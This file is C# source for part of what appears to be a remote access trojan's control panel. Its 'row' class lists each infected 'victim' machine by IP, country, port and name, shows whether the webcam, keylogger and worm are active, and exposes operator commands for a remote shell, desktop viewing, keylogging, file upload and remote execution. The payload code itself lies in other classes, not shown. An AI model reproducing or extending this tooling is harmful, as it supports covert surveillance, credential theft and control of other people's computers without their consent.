using System;
using System.Collections.Generic;
using System.Linq;
using System.Drawing;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ConsoleApplication4
{
    class row : emptyRow 
    {
        private victim v;
        private bool inCheck = false ; 
        public row(victim v , byte color) : base(color)
        {

            
            this.v = v; 
            PictureBox b = new PictureBox();

            
            b.Image = new Bitmap(tools.getCountryFlag(internet.countryCode(v.getIp())));  // load the image 
            inilabel(ipadd,v.getIp());
            inilabel(portl, ""+v.getPort());
            inilabel(note, "click here");
            inilabel(active, "" + v.getDate());
            inilabel(namel, v.getName());

            switch (v.getCam()){
                case 1 : inilabel(caml,"Available") ;
                    break ;
                default :  inilabel(caml,"none") ;   
                    break; 
            }

           switch (v.getKey()){
                case 1 : inilabel(log,"Active") ;
                    break ;
                default :  inilabel(log,"Inactive") ;   
                    break; 
            }

            switch (v.getWorm()){
                case 1 : inilabel(worml,"Active") ;
                    break ;
                default :  inilabel(worml,"Inactive") ;   
                    break; 
            }
            
             
            
            // fill the row 
            CheckBox cb = new CheckBox();
            cb.CheckedChanged += checkChanged; 
            this.Controls.Add(cb);
            this.Controls.Add(b);
            this.Controls.Add(ipadd); // ip adress 
            this.Controls.Add(portl);
            this.Controls.Add(namel);
            this.Controls.Add(note);
            this.Controls.Add(caml);
            this.Controls.Add(log);
            this.Controls.Add(worml);
            this.Controls.Add(active);


            this.ContextMenuStrip = Mainwin.cms; 
        }

        private  void checkChanged(object sender, System.EventArgs e)
        {   
            inCheck = ((CheckBox)sender).Checked  ;
           
        }


        public bool alive() {
            return this.v.SocketConnected(); 
        }
        public bool isInCheck() {
            return inCheck;  
        }

      
        public bool verify(String ip) {
            return ip == this.v.getIp(); 
        }

        public void close() {
            v.close(); 
        }

        public void cmd() {
            v.cmd(); 
        }
        public void desktop() {
            v.desktop();
        }
        public void keylogger() {
            v.keylogger(); 
        }

        public void speak() {
            v.speak(); 
        }

        public void nav() {
            v.nav(); 
        }

        public int UpFile(String file) { 
            if (inCheck) {
                fileTransfer ft = new fileTransfer(this.v.wr, this.v.ls);
                ft.add(file);
                
                ft.transfer(); 
                return 1; 
            } return 0; 
        }

        public int exec(String name) {
            if (inCheck)
            {

                v.exec(name); 
                return 1;
            } return 0;
        }


        public victim getV() {
            return v; 
        }

        private void inilabel(Label l , String st ) {
            l.AutoSize = true;
            l.BackColor = System.Drawing.Color.Transparent;
            l.Font = new System.Drawing.Font("PT Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            l.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(223)))), ((int)(((byte)(220)))), ((int)(((byte)(220)))));
            l.Location = new System.Drawing.Point(3, 2);
            l.Name = st;
            l.Size = new System.Drawing.Size(114, 14);
            l.TabIndex = 0;
            l.Text = st;
        }


        Label ipadd = new Label() ;
        Label caml = new Label();
        Label worml = new Label();
        Label log = new Label();
        Label note = new Label();
        Label portl = new Label();
        Label active = new Label();
        Label namel = new Label(); 
    }
    
}
